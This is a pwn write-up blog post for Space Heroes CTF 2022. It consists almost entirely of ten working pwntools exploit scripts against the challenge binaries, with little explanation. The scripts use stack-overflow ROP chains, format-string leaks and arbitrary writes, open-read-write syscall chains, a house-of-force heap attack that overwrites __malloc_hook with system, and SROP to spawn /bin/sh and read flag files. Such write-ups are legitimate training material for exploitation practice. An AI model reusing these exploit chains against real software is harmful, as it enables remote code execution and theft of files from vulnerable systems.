---
layout: post
title: Space Heroes CTF 2022 WP
subheading: Just Pwn
author: dayfly
categories: pwn
banner:
  video: null
  loop: true
  volume: 0.8
  start_at: 8.5
  image: https://wallpaperaccess.com/full/3532041.jpg
  opacity: 0.618
  background: "#000"
  height: "100vh"
  min_height: "38vh"
  heading_style: "font-size: 5em; font-weight: bold; text-decoration: none; min-width: 1400px"
  subheading_style: "color: gold"
tags: [fmt, orw, brop, srop, house of force, set]
sidebar: []
---

## Vader

```python
from pwn import *
from LibcSearcher import LibcSearcher
from sys import argv

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

binary = './vader'
elf = ELF(binary)
libc_path = '/glibc/buuoj-libc/2.23-amd64/libc-2.23.so'
libc = ELF(libc_path)
if argv[1] == 'r':
        p = remote('0.cloud.chals.io', 20712)
else:
        p = process(binary)

def ret2libc(leak_addr, pattern, path=''):
        if path == '':
                libc = LibcSearcher(pattern, leak_addr)
                base = leak_addr - libc.dump(pattern)
                system = base + libc.dump('system')
                binsh = base + libc.dump('str_bin_sh')
                execve = base + libc.dump('execve')
        else:
                libc = ELF(path)
                base = leak_addr - libc.sym[pattern]
                system = base + libc.sym['system']
                binsh = base + next(libc.search(b'/bin/sh'))

        return system, binsh, execve

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(str(delim), data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims             :p.recvuntil(delims)
rl      = lambda                    :p.recvline()
rls     = lambda num=1              :p.recvlines(num)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

def dbg():
        gdb.attach(p)
        pause()

def add(size):
        sla(':', '1')
        sla(':', str(size))

def edit(index, content):
        sla(':', '2')
        sla(':', str(index))
        sla(':', str(len(content)))
        sa(':', content)

def free(index):
        sla(':', '3')
        sla(':', str(index))

def show(index):
        sla(':', '4')
        sla(':', str(index))

# rdi   rsi   rdx   rcx   r8    r9

rdi = 0x000000000040165b
rsi_r15 = 0x0000000000401659
rdx = 0x00000000004011ce
rcx_r8 = 0x00000000004011d8

pay = b'b'*(0x20+8) 
pay += p64(rdi) + p64(0x402EC9) 
pay += p64(rsi_r15) + p64(0x402ECE) + p64(0)
pay += p64(rdx) + p64(0x402ED3)
pay += p64(rcx_r8) + p64(0x402ED6) + p64(0x402EDA)
pay += p64(0x40146B) 
pay += p64(0x4015B5)

sla('Now I am the master >>> ', pay)
print(rl())
itr()
```

## Guardians of the Galaxy

```python
from pwn import *
from LibcSearcher import LibcSearcher
from sys import argv

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

binary = './guardians'
elf = ELF(binary)
libc_path = '/glibc/buuoj-libc/2.23-amd64/libc-2.23.so'
libc = ELF(libc_path)
if argv[1] == 'r':
        p = remote('0.cloud.chals.io', 12690)
else:
        p = process(binary)

def ret2libc(leak_addr, pattern, path=''):
        if path == '':
                libc = LibcSearcher(pattern, leak_addr)
                base = leak_addr - libc.dump(pattern)
                system = base + libc.dump('system')
                binsh = base + libc.dump('str_bin_sh')
        else:
                libc = ELF(path)
                base = leak_addr - libc.sym[pattern]
                system = base + libc.sym['system']
                binsh = base + next(libc.search(b'/bin/sh'))

        return system, binsh

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(str(delim), data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims             :p.recvuntil(delims)
rl      = lambda                    :p.recvline()
rls     = lambda num=1              :p.recvlines(num)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

def dbg():
        gdb.attach(p)
        pause()

def add(size):
        sla(':', '1')
        sla(':', str(size))

def edit(index, content):
        sla(':', '2')
        sla(':', str(index))
        sla(':', str(len(content)))
        sa(':', content)

def free(index):
        sla(':', '3')
        sla(':', str(index))

def show(index):
        sla(':', '4')
        sla(':', str(index))

pay = '%12$p-%13$p-%14$p-%15$p-%16$p'
sla('Does Quill manage to win the dance battle?\n', pay)
print(rl())

flag_l = ['6d697b6674636873', '636172747369645f', '756f795f676e6974', '7d']

ch_l = ""
for v in flag_l:
        for i in range(len(v)-1, 0, -2):
                ch = v[i-1] + v[i]
                ch_l += chr(int(ch, 16))
                print(ch_l)

print(ch_l)
```

## Warmup to the Dark Side

```python
from pwn import *
from LibcSearcher import LibcSearcher
from sys import argv

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

p = remote('0.cloud.chals.io', 30096)

# binary = ''
# elf = ELF(binary)
libc_path = '/glibc/buuoj-libc/2.23-amd64/libc-2.23.so'
libc = ELF(libc_path)

def ret2libc(leak_addr, pattern, path=''):
        if path == '':
                libc = LibcSearcher(pattern, leak_addr)
                base = leak_addr - libc.dump(pattern)
                system = base + libc.dump('system')
                binsh = base + libc.dump('str_bin_sh')
        else:
                libc = ELF(path)
                base = leak_addr - libc.sym[pattern]
                system = base + libc.sym['system']
                binsh = base + next(libc.search(b'/bin/sh'))

        return system, binsh

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(str(delim), data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims             :p.recvuntil(delims)
rl      = lambda                    :p.recvline()
rls     = lambda num=1              :p.recvlines(num)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

def dbg():
        gdb.attach(p)
        pause()

def add(size):
        sla(':', '1')
        sla(':', str(size))

def edit(index, content):
        sla(':', '2')
        sla(':', str(index))
        sla(':', str(len(content)))
        sa(':', content)

def free(index):
        sla(':', '3')
        sla(':', str(index))

def show(index):
        sla(':', '4')
        sla(':', str(index))

ru('The Dark Side resides at:')
leak_addr = int(ru('\n')[:-1], 16)
log.success('leak_addr ' +hex(leak_addr))
pay = p64(leak_addr)*0x40
sla('Jedi Mind tricks dont work on me >>> \n', pay)
sl(pay)
print(rl())

# mark, learn brop
```

## T0NY TR4N5L4T0R

```python
from pwn import *
from LibcSearcher import LibcSearcher
from sys import argv

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

binary = './leet'
elf = ELF(binary)
libc_path = '/glibc/buuoj-libc/2.23-amd64/libc-2.23.so'
libc = ELF(libc_path)
if argv[1] == 'r':
        p = remote('0.cloud.chals.io', 26008)
else:
        p = process(binary)

def ret2libc(leak_addr, pattern, path=''):
        if path == '':
                libc = LibcSearcher(pattern, leak_addr)
                base = leak_addr - libc.dump(pattern)
                system = base + libc.dump('system')
                binsh = base + libc.dump('str_bin_sh')
        else:
                libc = ELF(path)
                base = leak_addr - libc.sym[pattern]
                system = base + libc.sym['system']
                binsh = base + next(libc.search(b'/bin/sh'))

        return system, binsh

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(str(delim), data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims             :p.recvuntil(delims)
rl      = lambda                    :p.recvline()
rls     = lambda num=1              :p.recvlines(num)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

def dbg():
        gdb.attach(p)
        pause()

def add(size):
        sla(':', '1')
        sla(':', str(size))

def edit(index, content):
        sla(':', '2')
        sla(':', str(index))
        sla(':', str(len(content)))
        sa(':', content)

def free(index):
        sla(':', '3')
        sla(':', str(index))

def show(index):
        sla(':', '4')
        sla(':', str(index))

main_addr = 0x0804921D
pay = b'a'*0x22
pay += b'e'*4 
pay += b'a'*0x7
pay += b'lleett' 
pay += p32(main_addr)
pay += b'0'*2
pay += b'c'

sl(pay)
itr()

```

## SATisfied

```python
from pwn import *
from sys import argv

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

binary = './satisfy'
elf = ELF(binary)
libc_path = '/glibc/buuoj-libc/2.23-amd64/libc-2.23.so'
libc = ELF(libc_path)
if argv[1] == 'r':
        p = remote('0.cloud.chals.io', 34720)
else:
        p = process(binary)

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(str(delim), data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims             :p.recvuntil(delims)
rl      = lambda                    :p.recvline()
rls     = lambda num=1              :p.recvlines(num)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

ru('Here is a random token')
num = int(ru('\n')[:-1])
log.success('num ' + str(num))

v3 = 31337 ^ num
log.success('v3 ' + str(v3))
res = (v3 << 0) ^ num
log.success('res ' + str(res))

pay = b'b'*0x10 + p64(0) + p64(v3) + b'b'*8 + p64(0x4013AA)
sla('What is your response >>> ', pay)
print(rls(3))
```

## Star Wars Galaxies 2

```python
from pwn import *
from LibcSearcher import LibcSearcher
from sys import argv

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

binary = './starwars'
elf = ELF(binary)
libc_path = '/glibc/buuoj-libc/2.23-amd64/libc-2.23.so'
libc = ELF(libc_path)
if argv[1] == 'r':
        p = remote('0.cloud.chals.io', 34916)
else:
        p = process(binary)

def ret2libc(leak_addr, pattern, path=''):
        if path == '':
                libc = LibcSearcher(pattern, leak_addr)
                base = leak_addr - libc.dump(pattern)
                system = base + libc.dump('system')
                binsh = base + libc.dump('str_bin_sh')
        else:
                libc = ELF(path)
                base = leak_addr - libc.sym[pattern]
                system = base + libc.sym['system']
                binsh = base + next(libc.search(b'/bin/sh'))

        return system, binsh

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(str(delim), data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims             :p.recvuntil(delims)
rl      = lambda                    :p.recvline()
rls     = lambda num=1              :p.recvlines(num)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

def dbg():
        gdb.attach(p)
        pause()

def add(name, id, cla):
        sla('>> ', '0')
        sla('Enter your player name: ', name)
        sla('Enter your player id number: ', str(id))
        sla('Select your player class: ', str(cla))

def play():
        sla('>> ', '1')

def show():
        sla('>> ', '2')

# offset = 8
pay = '---%25$s----%25$p' 
add(pay, 0x00FFFC18, 2)
show()
ru('----')
boss_addr = int(ru('\n')[:-1], 16)
log.success('boss_addr ' + hex(boss_addr))

pay = b'%97c%9$n' + p64(boss_addr)
add(pay, 0x00FFFC18, 2)
show()

pay = '----%p' 
add(pay, 0x00FFFC18, 2)
show()

ru('----')
stack_addr = int(ru('\n')[:-1], 16)
target_addr = stack_addr + 0x18
log.success('stack_addr ' + hex(stack_addr))
log.success('target_addr ' + hex(target_addr))

pay = b'--%9$s--' + p64(target_addr)
log.success('pay ' + str(pay))
add(pay, 0x00FFFC18, 2)
show()
play()

id_addr = uu64(ru('\x7f')[-6:])
log.success('id_addr ' + hex(id_addr))

pay = b'%252c10$hhnaaaaa' + p64(id_addr+3)
log.success('pay ' + str(pay))
add(pay, 0x00FFFC18, 2)
show()
show()
print(rls(4))

play()
itr()

# mark, learn x64 fmt
```

## Rocket

```python
from os import system
from pwn import *
from LibcSearcher import LibcSearcher
from sys import argv

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

binary = './pwn-rocket'
elf = ELF(binary)
libc_path = '/glibc/buuoj-libc/2.23-amd64/libc-2.23.so'
libc = ELF(libc_path)
if argv[1] == 'r':
        p = remote('0.cloud.chals.io', 13163)
else:
        p = process(binary)

def ret2libc(leak_addr, pattern, path=''):
        if path == '':
                libc = LibcSearcher(pattern, leak_addr)
                base = leak_addr - libc.dump(pattern)
                system = base + libc.dump('system')
                binsh = base + libc.dump('str_bin_sh')
        else:
                libc = ELF(path)
                base = leak_addr - libc.sym[pattern]
                system = base + libc.sym['system']
                binsh = base + next(libc.search(b'/bin/sh'))

        return system, binsh

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(str(delim), data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims             :p.recvuntil(delims)
rl      = lambda                    :p.recvline()
rls     = lambda num=1              :p.recvlines(num)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

def dbg():
        gdb.attach(p)
        pause()

def add(size):
        sla(':', '1')
        sla(':', str(size))

def edit(index, content):
        sla(':', '2')
        sla(':', str(index))
        sla(':', str(len(content)))
        sa(':', content)

def free(index):
        sla(':', '3')
        sla(':', str(index))

def show(index):
        sla(':', '4')
        sla(':', str(index))

offset = 10
pay = b'aa-%20$p'       # remote
# pay = b'aa-%21$p'     # local
sla('Please authenticate >>>\n', pay)
ru('Welcome: aa-')
base_addr = int(ru('\n')[:-1], 16) - 0x1606
vuln_addr = base_addr + 0x1531
log.success('base addr ' + hex(base_addr))
log.success('vuln addr ' + hex(vuln_addr))

rdi = 0x168b + base_addr
rsi_r15 = 0x1689 + base_addr
rdx = 0x14be + base_addr
puts_got = elf.got['puts'] + base_addr
puts_plt = elf.plt['puts'] + base_addr
flag_addr = 0x2db8 + base_addr
bss_addr = base_addr + 0x5500
syscall = base_addr + 0x14DB
rax = base_addr + 0x1210
ret = base_addr + 0x1016

# syscall number
# read          # 0
# write         # 1
# open          # 2

# orw
# open
leak = b'b'*0x48
leak += p64(rax) + p64(2)
leak += p64(rdi) + p64(flag_addr)
leak += p64(rsi_r15) + p64(0) + p64(0)
leak += p64(syscall)

# read
leak += p64(rax) + p64(0)
leak += p64(rdi) + p64(3)
leak += p64(rsi_r15) + p64(bss_addr) + p64(0)
leak += p64(rdx) + p64(0x100)
leak += p64(syscall)

# write
# leak += p64(rax) + p64(1)
# leak += p64(rdi) + p64(1)
# leak += p64(rsi_r15) + p64(bss_addr) + p64(0)
# leak += p64(rdx) + p64(0x100)
# leak += p64(syscall)
leak += p64(rdi) + p64(bss_addr)
leak += p64(puts_plt)
leak += p64(vuln_addr)

sla('Tell me to do something >>>', leak)

print(rls(3))

# mark, learn syscall and orw
```

## Rule of Two

```python
from os import system
from pwn import *
from LibcSearcher import LibcSearcher
from sys import argv

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

binary = './vader'
elf = ELF(binary)
libc_path = '/glibc/buuoj-libc/2.23-amd64/libc-2.23.so'
libc = ELF(libc_path)
if argv[1] == 'r':
        p = remote('0.cloud.chals.io', 20712)
else:
        p = process(binary)

def ret2libc(leak_addr, pattern, path=''):
        if path == '':
                libc = LibcSearcher(pattern, leak_addr)
                base = leak_addr - libc.dump(pattern)
                system = base + libc.dump('system')
                binsh = base + libc.dump('str_bin_sh')
        else:
                libc = ELF(path)
                base = leak_addr - libc.sym[pattern]
                system = base + libc.sym['system']
                binsh = base + next(libc.search(b'/bin/sh'))

        return system, binsh

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(str(delim), data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims             :p.recvuntil(delims)
rl      = lambda                    :p.recvline()
rls     = lambda num=1              :p.recvlines(num)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

def dbg():
        gdb.attach(p)
        pause()

def add(size):
        sla(':', '1')
        sla(':', str(size))

def edit(index, content):
        sla(':', '2')
        sla(':', str(index))
        sla(':', str(len(content)))
        sa(':', content)

def free(index):
        sla(':', '3')
        sla(':', str(index))

def show(index):
        sla(':', '4')
        sla(':', str(index))

# rdi   rsi   rdx   rcx   r8    r9

rdi = 0x40165b
rsi_r15 = 0x401659
rdx = 0x00000000004011ce
rcx_r8 = 0x00000000004011d8
bss_addr = 0x405000
main_addr = 0x4015B5
fgets_addr = 0x401060
stdin_off = 0x405070
fopen_addr = 0x401080
r_mode_addr = 0x402EE0
puts_addr = 0x401030
a_flag_txt = 0x402EE2
leave_ret = 0x4015F8
rbp = 0x40116d
ret = 0x401016
elf_got_put = 0x405018

# leak stdin
pay1 = b'b'*(0x20) + p64(bss_addr+0x500+0x20) 
pay1 += p64(rdi) + p64(stdin_off) 
pay1 += p64(puts_addr)
pay1 += p64(main_addr)

sla('Now I am the master >>> ', pay1)
stdin_got = uu64(ru('\x7f')[-6:])
log.success('stdin_got ' + hex(stdin_got))
log.success('pay= ' + str(pay1))

# read sith.txt to bss
pay2 = b'b'*(0x20) + p64(bss_addr+0x500+0x20)
pay2 += p64(rdi) + p64(bss_addr+0x600) 
pay2 += p64(rsi_r15) + p64(0x10) + p64(0)
pay2 += p64(rdx) + p64(stdin_got)
pay2 += p64(fgets_addr)

# open sith.txt
pay2 += p64(rdi) + p64(bss_addr+0x600) 
pay2 += p64(rsi_r15) + p64(r_mode_addr) + p64(0)
pay2 += p64(fopen_addr)

# read sith.txt and print flag
pay2 += p64(rbp)
pay2 += p64(bss_addr+0x800+0x30)
pay2 += p64(0x40155E)

log.success('len(pay2) ' + hex(len(pay2)))
sla('Now I am the master >>> ', pay2)

sl(b'sith.txt\x00')
print(rls(2))

# mark, learn orw
```

## Use the Force, Luke

```python
from pwn import *
from sys import argv

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

binary = './force'
elf = ELF(binary)
libc_path = './.glibc/glibc_2.28_no-tcache/libc.so.6'
libc = ELF(libc_path)
if argv[1] == 'r':
        p = remote('0.cloud.chals.io', 11996)
else:
        p = process(binary)

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(str(delim), data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims             :p.recvuntil(delims)
rl      = lambda                    :p.recvline()
rls     = lambda num=1              :p.recvlines(num)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

def dbg():
        gdb.attach(p)
        pause()

def add(size, cont):
        sla('(2) Surrender\n', '1')
        sla('How many midi-chlorians?: ', str(size))
        sa('What do you feel?: ', cont)

ru('You feel a system at ')
system_addr = int(ru('\n')[:-1], 16)
ru('You feel something else at ')
chunk0_addr = int(ru('\n')[:-1], 16)

malloc_hook = system_addr - libc.symbols['system'] + libc.symbols['__malloc_hook']
log.success('system addr ' + hex(system_addr))
log.success('chunk0 addr ' + hex(chunk0_addr))
log.success('malloc hook ' + hex(malloc_hook))
# dbg()

# overwrite the top chunk to a huge size
add(0x90, b'a'*0x98+p64(0xffffffffffffffff))
# dbg()

# move the top chunk
fake_size = malloc_hook - 0x10 - (chunk0_addr + 0x90 + 0x10) - 0x10
add(fake_size, b'/bin/sh\x00')
# dbg()

# overwrite the malloc_hook to system
add(0x10, p64(system_addr))
binsh_addr = chunk0_addr + 0x90 + 0x10 + 0x10
log.success('binsh_addr ' + hex(binsh_addr))
# dbg()

# send the address of binsh
add(binsh_addr, b'cat flag.txt\n')
# dbg()

itr()

# mark, learn house of force
```

## Blackhole ROP

```python
from pwn import *
from LibcSearcher import LibcSearcher
from sys import argv

# context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

p = remote('0.cloud.chals.io', 12655)

def ret2libc(leak_addr, pattern, path=''):
        if path == '':
                libc = LibcSearcher(pattern, leak_addr)
                base = leak_addr - libc.dump(pattern)
                system = base + libc.dump('system')
                binsh = base + libc.dump('str_bin_sh')
        else:
                libc = ELF(path)
                base = leak_addr - libc.sym[pattern]
                system = base + libc.sym['system']
                binsh = base + next(libc.search(b'/bin/sh'))

        return system, binsh

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(str(delim), data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims             :p.recvuntil(delims)
rl      = lambda                    :p.recvline()
rls     = lambda num=1              :p.recvlines(num)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

def dbg():
        gdb.attach(p)
        pause()

def write_to_writeable(data, addr):
        for i in range(len(data)):
                pay = b'%' + str(ord(data[i])).encode('utf-8') + b'c%8$n'
                pay = pay.ljust(0x10, b'\x00') + p64(addr+i)
                sl(pay)
                print(pay)
                print(ru('You say:'))

def edit(index, content):
        sla(':', '2')
        sla(':', str(index))
        sla(':', str(len(content)))
        sa(':', content)

def free(index):
        sla(':', '3')
        sla(':', str(index))

def show(index):
        sla(':', '4')
        sla(':', str(index))

ru('Address of syscall, ret    : ')
syscall = int(ru('\n')[:-1], 16)
ru('Address of writable memory : ')
bss = int(ru('\n')[:-1], 16)
ru('Address of pop rax, ret    : ')
rax = int(ru('\n')[:-1], 16)

log.success('syscall ' + hex(syscall))
log.success('bss ' + hex(bss))
log.success('rax ret' + hex(rax))

# write binsh to a writeable address
write_to_writeable('/bin/sh', bss)

pay = b'%8$s' + b'\x00'*8 + b'----' + p64(bss)
sl(pay)
print(pay)
print(rls(3))

# srop
frame = SigreturnFrame()
frame.rip = syscall
frame.rax = 59
frame.rdi = bss
frame.rsi = 0
frame.rdx = 0

# padding is 0x28
pay = b'b'*0x28 + p64(rax) + p64(0xf) + p64(syscall) + bytes(frame)
sl(pay)

ru('@')
sl('cat flag.txt')
itr()

# mark, learn brop, srop and fmt
```